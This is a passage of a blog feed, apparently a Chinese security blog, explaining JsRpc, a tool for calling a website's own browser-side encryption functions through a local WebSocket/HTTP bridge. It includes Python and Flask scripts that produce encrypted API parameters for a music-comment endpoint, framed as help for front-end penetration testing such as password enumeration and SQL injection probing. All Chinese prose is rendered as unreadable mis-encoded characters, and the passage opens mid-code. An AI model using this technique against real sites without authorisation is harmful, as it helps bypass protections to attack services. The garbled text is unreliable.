function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1713261612399-d6afa6d9-a91e-47b0-ad2a-3eaaf955d680.png" alt="img"></p><h2 id="å®Œæ•´ä»£ç ï¼š"><a href="#å®Œæ•´ä»£ç ï¼š" class="headerlink" title="å®Œæ•´ä»£ç ï¼š"></a>å®Œæ•´ä»£ç ï¼š</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode1 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>æµæ³ª<span class="string">&quot;, &quot;</span>å¼º<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode2 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var Rj5o_md = [&quot;</span>è‰²<span class="string">&quot;, &quot;</span>æµæ„Ÿ<span class="string">&quot;, &quot;</span>è¿™è¾¹<span class="string">&quot;, &quot;</span>å¼±<span class="string">&quot;, &quot;</span>å˜´å”‡<span class="string">&quot;, &quot;</span>äº²<span class="string">&quot;, &quot;</span>å¼€å¿ƒ<span class="string">&quot;, &quot;</span>å‘²ç‰™<span class="string">&quot;, &quot;</span>æ†¨ç¬‘<span class="string">&quot;, &quot;</span>çŒ«<span class="string">&quot;, &quot;</span>çš±çœ‰<span class="string">&quot;, &quot;</span>å¹½çµ<span class="string">&quot;, &quot;</span>è›‹ç³•<span class="string">&quot;, &quot;</span>å‘æ€’<span class="string">&quot;, &quot;</span>å¤§å“­<span class="string">&quot;, &quot;</span>å…”å­<span class="string">&quot;, &quot;</span>æ˜Ÿæ˜Ÿ<span class="string">&quot;, &quot;</span>é’Ÿæƒ…<span class="string">&quot;, &quot;</span>ç‰µæ‰‹<span class="string">&quot;, &quot;</span>å…¬é¸¡<span class="string">&quot;, &quot;</span>çˆ±æ„<span class="string">&quot;, &quot;</span>ç¦æ­¢<span class="string">&quot;, &quot;</span>ç‹—<span class="string">&quot;, &quot;</span>äº²äº²<span class="string">&quot;, &quot;</span>å‰<span class="string">&quot;, &quot;</span>ç¤¼ç‰©<span class="string">&quot;, &quot;</span>æ™•<span class="string">&quot;, &quot;</span>å‘†<span class="string">&quot;, &quot;</span>ç”Ÿç—…<span class="string">&quot;, &quot;</span>é’»çŸ³<span class="string">&quot;, &quot;</span>æ‹œ<span class="string">&quot;, &quot;</span>æ€’<span class="string">&quot;, &quot;</span>ç¤ºçˆ±<span class="string">&quot;, &quot;</span>æ±—<span class="string">&quot;, &quot;</span>å°é¸¡<span class="string">&quot;, &quot;</span>ç—›è‹¦<span class="string">&quot;, &quot;</span>æ’‡å˜´<span class="string">&quot;, &quot;</span>æƒ¶æ<span class="string">&quot;, &quot;</span>å£ç½©<span class="string">&quot;, &quot;</span>åèˆŒ<span class="string">&quot;, &quot;</span>å¿ƒç¢<span class="string">&quot;, &quot;</span>ç”Ÿæ°”<span class="string">&quot;, &quot;</span>å¯çˆ±<span class="string">&quot;, &quot;</span>é¬¼è„¸<span class="string">&quot;, &quot;</span>è·³èˆ<span class="string">&quot;, &quot;</span>ç”·å­©<span class="string">&quot;, &quot;</span>å¥¸ç¬‘<span class="string">&quot;, &quot;</span>çŒª<span class="string">&quot;, &quot;</span>åœˆ<span class="string">&quot;, &quot;</span>ä¾¿ä¾¿<span class="string">&quot;, &quot;</span>å¤–æ˜Ÿ<span class="string">&quot;, &quot;</span>åœ£è¯<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    s = p(Rj5o_md);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>çˆ±å¿ƒ<span class="string">&quot;, &quot;</span>å¥³å­©<span class="string">&quot;, &quot;</span>æƒŠæ<span class="string">&quot;, &quot;</span>å¤§ç¬‘<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">des_enc</span>():</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode1</span><br><span class="line">    &#125;</span><br><span class="line">    res1 = requests.<span class="title function_">post</span>(url, data=data1)</span><br><span class="line"></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode2</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.<span class="title function_">post</span>(url, data=data2)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode3</span><br><span class="line">    &#125;</span><br><span class="line">    res3 = requests.<span class="title function_">post</span>(url, data=data3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res1, res2, res3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res1, res2, res3 = <span class="title function_">des_enc</span>()</span><br><span class="line">param2 = json.<span class="title function_">loads</span>(res1.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">param3 = json.<span class="title function_">loads</span>(res2.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">param4 = json.<span class="title function_">loads</span>(res3.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">param1 = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1, <span class="string">&quot;param2&quot;</span>: param2, <span class="string">&quot;param3&quot;</span>: param3, <span class="string">&quot;param4&quot;</span>: param4&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><h1 id="autodecoderè”åŠ¨"><a href="#autodecoderè”åŠ¨" class="headerlink" title="autodecoderè”åŠ¨"></a>autodecoderè”åŠ¨</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">åŠ å¯†å‡½æ•°ï¼š</span><br><span class="line"><span class="keyword">var</span> bKL3x = <span class="variable language_">window</span>.<span class="title function_">asrsea</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i1x), <span class="title function_">bvl3x</span>([<span class="string">&quot;æµæ³ª&quot;</span>, <span class="string">&quot;å¼º&quot;</span>]), <span class="title function_">bvl3x</span>(<span class="title class_">Rj6</span>d.<span class="property">md</span>), <span class="title function_">bvl3x</span>([<span class="string">&quot;çˆ±å¿ƒ&quot;</span>, <span class="string">&quot;å¥³å­©&quot;</span>, <span class="string">&quot;æƒŠæ&quot;</span>, <span class="string">&quot;å¤§ç¬‘&quot;</span>]));</span><br></pre></td></tr></table></figure><p>1ã€å‰ç«¯æ³¨å…¥çš„JSè¿›è¡Œå‚æ•°è°ƒç”¨ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">bvl3x</span> = bvl3x</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">Rj6d_md</span> = [<span class="string">&quot;è‰²&quot;</span>, <span class="string">&quot;æµæ„Ÿ&quot;</span>, <span class="string">&quot;è¿™è¾¹&quot;</span>, <span class="string">&quot;å¼±&quot;</span>, <span class="string">&quot;å˜´å”‡&quot;</span>, <span class="string">&quot;äº²&quot;</span>, <span class="string">&quot;å¼€å¿ƒ&quot;</span>, <span class="string">&quot;å‘²ç‰™&quot;</span>, <span class="string">&quot;æ†¨ç¬‘&quot;</span>, <span class="string">&quot;çŒ«&quot;</span>, <span class="string">&quot;çš±çœ‰&quot;</span>, <span class="string">&quot;å¹½çµ&quot;</span>, <span class="string">&quot;è›‹ç³•&quot;</span>, <span class="string">&quot;å‘æ€’&quot;</span>, <span class="string">&quot;å¤§å“­&quot;</span>, <span class="string">&quot;å…”å­&quot;</span>, <span class="string">&quot;æ˜Ÿæ˜Ÿ&quot;</span>, <span class="string">&quot;é’Ÿæƒ…&quot;</span>, <span class="string">&quot;ç‰µæ‰‹&quot;</span>, <span class="string">&quot;å…¬é¸¡&quot;</span>, <span class="string">&quot;çˆ±æ„&quot;</span>, <span class="string">&quot;ç¦æ­¢&quot;</span>, <span class="string">&quot;ç‹—&quot;</span>, <span class="string">&quot;äº²äº²&quot;</span>, <span class="string">&quot;å‰&quot;</span>, <span class="string">&quot;ç¤¼ç‰©&quot;</span>, <span class="string">&quot;æ™•&quot;</span>, <span class="string">&quot;å‘†&quot;</span>, <span class="string">&quot;ç”Ÿç—…&quot;</span>, <span class="string">&quot;é’»çŸ³&quot;</span>, <span class="string">&quot;æ‹œ&quot;</span>, <span class="string">&quot;æ€’&quot;</span>, <span class="string">&quot;ç¤ºçˆ±&quot;</span>, <span class="string">&quot;æ±—&quot;</span>, <span class="string">&quot;å°é¸¡&quot;</span>, <span class="string">&quot;ç—›è‹¦&quot;</span>, <span class="string">&quot;æ’‡å˜´&quot;</span>, <span class="string">&quot;æƒ¶æ&quot;</span>, <span class="string">&quot;å£ç½©&quot;</span>, <span class="string">&quot;åèˆŒ&quot;</span>, <span class="string">&quot;å¿ƒç¢&quot;</span>, <span class="string">&quot;ç”Ÿæ°”&quot;</span>, <span class="string">&quot;å¯çˆ±&quot;</span>, <span class="string">&quot;é¬¼è„¸&quot;</span>, <span class="string">&quot;è·³èˆ&quot;</span>, <span class="string">&quot;ç”·å­©&quot;</span>, <span class="string">&quot;å¥¸ç¬‘&quot;</span>, <span class="string">&quot;çŒª&quot;</span>, <span class="string">&quot;åœˆ&quot;</span>, <span class="string">&quot;ä¾¿ä¾¿&quot;</span>, <span class="string">&quot;å¤–æ˜Ÿ&quot;</span>, <span class="string">&quot;åœ£è¯&quot;</span>]</span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;enc&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">asrsea</span>(param,<span class="title function_">bvl3x</span>([<span class="string">&quot;æµæ³ª&quot;</span>, <span class="string">&quot;å¼º&quot;</span>]), <span class="title function_">bvl3x</span>(<span class="title class_">Rj6</span>d_md), <span class="title function_">bvl3x</span>([<span class="string">&quot;çˆ±å¿ƒ&quot;</span>, <span class="string">&quot;å¥³å­©&quot;</span>, <span class="string">&quot;æƒŠæ&quot;</span>, <span class="string">&quot;å¤§ç¬‘&quot;</span>]));</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&quot;params=&quot;</span>+<span class="built_in">encodeURIComponent</span>(res.<span class="property">encText</span>)+<span class="string">&quot;&amp;encSecKey=&quot;</span>+res.<span class="property">encSecKey</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>2ã€Pythonä»£ç ä¹Ÿå¯ä»¥ä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;enc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(param)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071119854.png" alt="image.png"> </p><p>3ã€autodecoderä»£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/decode&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">decrypt</span>():</span><br><span class="line">    param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;dataBody&#x27;</span>)  # è·å–  post å‚æ•°</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;enc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(param)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)  # è¿™é‡Œæ¢getä¹Ÿæ˜¯å¯ä»¥çš„</span><br><span class="line"></span><br><span class="line">    encry_param = json.<span class="title function_">loads</span>(res.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;param:&quot;</span>, json.<span class="title function_">dumps</span>(param))</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">200</span>)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;encry_param:&quot;</span>,encry_param)</span><br><span class="line">    <span class="keyword">return</span> encry_param</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/encode&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">encrypt</span>():</span><br><span class="line">    param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;dataBody&#x27;</span>)  # è·å–  post å‚æ•°</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="property">debug</span> = <span class="title class_">True</span>  # è®¾ç½®è°ƒè¯•æ¨¡å¼ï¼Œç”Ÿäº§æ¨¡å¼çš„æ—¶å€™è¦å…³æ‰debug</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117344.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117365.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JsRpc </tag>
            
            <tag> åŠ è§£å¯† </tag>
            
            <tag> autodecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JsRpc:æå‡å‰ç«¯æ¸—é€æµ‹è¯•æ•ˆç‡</title>
      <link href="/2024/05/06/JsRpc-%E6%8F%90%E5%8D%87%E5%89%8D%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/"/>
      <url>/2024/05/06/JsRpc-%E6%8F%90%E5%8D%87%E5%89%8D%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Rpcæ¦‚è¿°"><a href="#Rpcæ¦‚è¿°" class="headerlink" title="Rpcæ¦‚è¿°"></a>Rpcæ¦‚è¿°</h1><h2 id="ä»€ä¹ˆæ˜¯RPC"><a href="#ä»€ä¹ˆæ˜¯RPC" class="headerlink" title="ä»€ä¹ˆæ˜¯RPC"></a>ä»€ä¹ˆæ˜¯RPC</h2><p>å…¨ç§° Remote Procedure Callâ€”â€”è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ã€‚</p><p>åœ¨ç½‘ç«™çš„æ§åˆ¶å°æ–°å»ºä¸€ä¸ªWebScoketå®¢æˆ·ç«¯é“¾æ¥åˆ°æœåŠ¡å™¨é€šä¿¡ï¼Œè°ƒç”¨æœåŠ¡å™¨çš„æ¥å£ æœåŠ¡å™¨ä¼šå‘é€ä¿¡æ¯ç»™å®¢æˆ·ç«¯</p><p>å®¢æˆ·ç«¯æ¥æ”¶åˆ°è¦æ‰§è¡Œçš„æ–¹æ³•æ‰§è¡Œå®Œjsä»£ç åæŠŠè·å¾—æƒ³è¦çš„å†…å®¹å‘å›ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ¥æ”¶åˆ°åå†æ˜¾ç¤ºå‡ºæ¥</p><p><strong>åœ¨jsåŠ å¯†ä¸­JsRPCæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</strong></p><p>æ¯”å¦‚åœ¨è®¿é—®ç½‘ç«™æ—¶ï¼Œæˆ‘ä»¬æƒ³ç›´æ¥æ›¿æ¢å‚æ•°ï¼ŒæŸ¥çœ‹æœ‰æ— sqlæ³¨å…¥æˆ–è€…æƒ³æšä¸¾å¯†ç ã€æŒ–æ˜é€»è¾‘æ¼æ´æ›¿æ¢å‚æ•°ã€‚ä½†æ˜¯å‘ç°å‚æ•°å€¼æ˜¯åŠ å¯†çš„ã€‚æ­¤æ—¶ï¼Œé˜…è¯»jsä»£ç ã€è¡¥ç¯å¢ƒå¾ˆè´¹æ—¶è´¹åŠ›ã€‚ä¸Šæ‰‹éš¾åº¦è¾ƒå¤§ã€‚</p><p>è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨JsRPCã€‚</p><p>RPCçš„ä¼˜ç‚¹ï¼šå…å»æ‰£å–ä»£ç å’Œè¡¥ç¯å¢ƒçš„æ­¥éª¤ã€‚ã€‚ã€‚</p><h2 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h2><p>ç”¨æˆ·æ‰¾åˆ°åŠ å¯†å‡½æ•°çš„ä½ç½®ã€æœ€é‡è¦ã€‘</p><p>åœ¨æµè§ˆå™¨çš„consoleä¸­è¾“å…¥env.jsï¼ˆåŒ…ä¸­è‡ªå¸¦çš„ï¼‰</p><p>cmdä¸­è¿è¡Œjsrpcç¨‹åº</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061630850.png" alt="image-20240506163047789"> </p><h1 id="å·¥å…·ä»‹ç»"><a href="#å·¥å…·ä»‹ç»" class="headerlink" title="å·¥å…·ä»‹ç»"></a>å·¥å…·ä»‹ç»</h1><p>ä¸‹è½½åœ°å€</p><p><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p><h2 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- main.go (æœåŠ¡å™¨çš„ä¸»ä»£ç )</span><br><span class="line">-- resouces/JsEnv_Dev.js (å®¢æˆ·ç«¯æ³¨å…¥jsç¯å¢ƒ)</span><br></pre></td></tr></table></figure><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>è¿è¡ŒæœåŠ¡å™¨ç¨‹åºå’Œjsè„šæœ¬ å³å¯è®©å®ƒä»¬é€šä¿¡ï¼Œå®ç°è°ƒç”¨æ¥å£æ‰§è¡Œjsè·å–æƒ³è¦çš„å€¼(åŠ è§£å¯†)</p><h2 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h2><p>åŸç†ï¼šåœ¨ç½‘ç«™çš„æ§åˆ¶å°æ–°å»ºä¸€ä¸ªWebScoketå®¢æˆ·ç«¯é“¾æ¥åˆ°æœåŠ¡å™¨é€šä¿¡ï¼Œè°ƒç”¨æœåŠ¡å™¨çš„æ¥å£ æœåŠ¡å™¨ä¼šå‘é€ä¿¡æ¯ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ¥æ”¶åˆ°è¦æ‰§è¡Œçš„æ–¹æ³•æ‰§è¡Œå®Œjsä»£ç åæŠŠè·å¾—æƒ³è¦çš„å†…å®¹å‘å›ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ¥æ”¶åˆ°åå†æ˜¾ç¤ºå‡ºæ¥</p><p>ã€è¯´æ˜ã€‘æœ¬æ–¹æ³•å¯ä»¥httpsè¯ä¹¦ä¸”æ”¯æŒwss</p><p>åœ¨httpsçš„ç½‘ç«™æƒ³è¦æ–°å»ºWebSocketè¿æ¥å¦‚æœæ˜¯è¿æ¥åˆ°æ™®é€šçš„wsä¼šæŠ¥å®‰å…¨é”™è¯¯ï¼Œè¿æ¥æœ¬åœ°(127.0.0.1)ä¸ä¼šæŠ¥é”™~ å¯ä»¥ç”¨æœ¬åœ°å’Œwss ä½ è‡ªå·±çœ‹ç€ç©</p><ol><li>æ— httpsè¯ä¹¦è€…ã€‚ç›´æ¥ç¼–è¯‘main.go ä½¿ç”¨æœ¬åœ°ip(127.0.0.1)å¯ä»¥åœ¨httpsçš„ç½‘ç«™ç›´æ¥è¿æ¥wsä½¿ç”¨ é»˜è®¤ç«¯å£12080</li><li>æœ‰httpsè¯ä¹¦è€…ã€‚ä¿®æ”¹main.goæ–‡ä»¶ æŠŠr.Run()æ³¨é‡Šæ‰ï¼ŒæŠŠr.RunTlsæ³¨é‡Šå–æ¶ˆæ‰ å¹¶ä¸”å‚æ•°è®¾ç½®è¯ä¹¦çš„è·¯å¾„ ç›´æ¥è¾“å…¥åå­—å°±æ˜¯å½“å‰è·¯å¾„ é»˜è®¤ç«¯å£ï¼š12443</li></ol><h1 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h1><p>1ã€æ‰“å¼€ç¼–è¯‘å¥½çš„æ–‡ä»¶ï¼Œå¼€å¯æœåŠ¡releaseä¸‹è½½ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061642614.png" alt="image.png"> </p><p><strong>apiç®€ä»‹</strong>ï¼š</p><ul><li>&#x2F;listï¼šæŸ¥çœ‹å½“å‰è¿æ¥çš„wsæœåŠ¡ï¼ˆgetï¼‰</li><li>&#x2F;wsï¼šæµè§ˆå™¨æ³¨å…¥wsè¿æ¥çš„ç«¯å£ï¼ˆws|wssï¼‰</li><li>&#x2F;wstï¼šwsæµ‹è¯•ä½¿ç”¨ï¼Œå‘å•¥å›å•¥ï¼ˆws|wssï¼‰</li><li>&#x2F;goï¼šè·å–æ•°æ®çš„æ¥å£ï¼ˆget|postï¼‰</li><li>&#x2F;execjsï¼šä¼ é€’jscodeç»™æµè§ˆå™¨æ‰§è¡Œï¼ˆget|postï¼‰</li></ul><p>è¯´æ˜ï¼šæ¥å£ç”¨?groupå’Œnameæ¥åŒºåˆ†ä»»åŠ¡ï¼Œå¦‚â€ws:&#x2F;&#x2F;127.0.0.1:1280&#x2F;ws?group&#x3D;{}&amp;name&#x3D;{}â€&#x2F;&#x2F;æ³¨å…¥wsçš„ä¾‹å­ groupå’Œnameéƒ½å¯ä»¥éšä¾¿èµ·å(å¿…å¡«) <a href="http://127.0.0.1:12080/go?group=%7B%7D&name=%7B%7D&action=%7B%7D&param=%7B%7D">http://127.0.0.1:12080/go?group={}&amp;name={}&amp;action={}&amp;param={}</a> &#x2F;&#x2F;è¿™æ˜¯è°ƒç”¨çš„æ¥å£ groupå’Œnameå¡«å†™ä¸Šé¢æ³¨å…¥æ—¶å€™çš„ï¼Œactionæ˜¯æ³¨å†Œçš„æ–¹æ³•å,paramæ˜¯å¯é€‰çš„å‚æ•° æ¥å£å‚æ•°æš‚å®šä¸ºè¿™å‡ ä¸ªï¼Œä½†æ˜¯paramè¿˜å¯ä»¥ä¼ stringifyè¿‡çš„json(å­—ç¬¦ä¸²) ä¸‹é¢ä¼šä»‹ç»ã€‚</p><p>2ã€æ³¨å…¥JSï¼Œæ„å»ºé€šä¿¡ç¯å¢ƒï¼ˆ&#x2F;resource&#x2F;JsEnv.jsï¼‰</p><p>æ‰“å¼€JsEnv å¤åˆ¶ç²˜è´´åˆ°ç½‘ç«™æ§åˆ¶å°(æ³¨æ„ï¼šå¯ä»¥åœ¨æµè§ˆå™¨å¼€å¯çš„æ—¶å€™å°±å…ˆæ³¨å…¥ç¯å¢ƒï¼Œä¸ç„¶è¦æ”¾å¼€è°ƒè¯•æ–­ç‚¹æ‰èƒ½æ³¨å…¥)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061644138.png" alt="image.png"> </p><p>3ã€è¿æ¥é€šä¿¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// æ³¨å…¥ç¯å¢ƒåè¿æ¥é€šä¿¡</span><br><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br></pre></td></tr></table></figure><h2 id="I-è¿œç¨‹è°ƒç”¨0"><a href="#I-è¿œç¨‹è°ƒç”¨0" class="headerlink" title="I è¿œç¨‹è°ƒç”¨0"></a>I 